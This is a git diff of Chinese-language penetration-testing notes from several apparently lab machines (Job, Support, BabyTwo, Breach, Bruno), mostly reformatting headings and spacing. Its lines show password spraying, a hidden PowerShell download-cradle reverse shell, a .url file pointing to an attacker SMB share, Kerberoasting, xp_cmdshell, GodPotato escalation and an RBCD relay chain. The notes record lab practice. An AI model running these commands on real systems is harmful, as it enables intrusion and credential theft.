@@ -8,7 +8,7 @@
 [★]$ nxc smb 10.129.234.72 -u users.txt -p users.txt --no-bruteforce --continue-on-success //同行配对--no-bruteforce
 ```
 ————————————————————————————————————
-### form Job
+#### form Job
 
 <details>
 <summary>反shell的区别</summary>
@@ -29,7 +29,6 @@ c:\ProgramData>.\god.exe -cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(N
 #### form Support 
 
 <details>
-
 <summary>BloodHound</summary>
 
 ```
@@ -48,14 +47,12 @@ AzureHound.md  DebugBuilds  SharpHound.exe  SharpHound.ps1
 导入到 
 [~/Downloads/BloodHound-linux-x64][★]$ ./BloodHound --no-sandbox --disable-gpu
 ```
-
 </details>
 
 ————————————————————————————————————
 #### From BabyTwo
 
 <details>
-
 <summary>WriteDacl--PowerView.ps1 && GenericAll--pyGPOAbuse</summary>
 
 ```
@@ -74,14 +71,12 @@ https://github.com/Hackndo/pyGPOAbuse
 
 PS C:\Users\amelia.griffiths> gpupdate
 ```
-
 </details>
 
 ————————————————————————————————————
 ####  From Breach
 
 <details>
-
 <summary>.url 快捷方式配置格式</summary>
 
 ```
@@ -92,11 +87,9 @@ WorkingDirectory=hehe 				//工作目录
 IconFile=\\10.10.14.27\aasd\nc.ico 	//nc.ico 只是一个 图标文件名
 IconIndex=1 						//指定图标文件中的第几个图标,格式完整
 ```
-
 </details>
 
 <details>
-
 <summary>Kerberoastable Account</summary>
 
 ```
@@ -118,11 +111,9 @@ SQL (BREACH\Administrator  dbo@master)>
 
 另外刷新 Kerberos，[★]$ kdestroy
 ```
-
 </details>
 
 <details>
-
 <summary>mssql 启用 xp_cmdshell 功能并在目标系统内执行命令</summary>
 
 ```
@@ -142,14 +133,12 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 [6]使用“GodPotato”来提升权限并获取以“nt”权限或“系统”身份的反弹shell，https://github.com/BeichenDream/GodPotato
 PS C:\Windows\tasks> .\GodPotato-NET4.exe -cmd 'powershell -exec bypass -enc <Base64Payload>'
 ```
-
 </details>
 
 ————————————————————————————————————
 #### From Bruno
 
 <details>
-
 <summary>一个典型的 AD 提权链（MAQ + COM → Kerberos Relay → RBCD → 接管 Administrator）</summary>
 
 ```
@@ -181,11 +170,9 @@ PS C:\programdata> Expand-Archive sharpmad.zip //解压
 PS C:\programdata> ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe //生成.exe的默认路径
 PS C:\programdata> .\MSBuild.exe sharpmad/sharpmad/Sharpmad.csproj
 ```
-
 </details>
 
 <details>
-
 <summary>FTP 目录完整和二进制文件传输完整</summary>
 
 ```
@@ -200,7 +187,6 @@ ftp> mget *
 mget changelog [anpqy?]? 
 [★]$ tar -czvf app.tar.gz app
 ```
-
 </details>
 
 ————————————————————————————————————
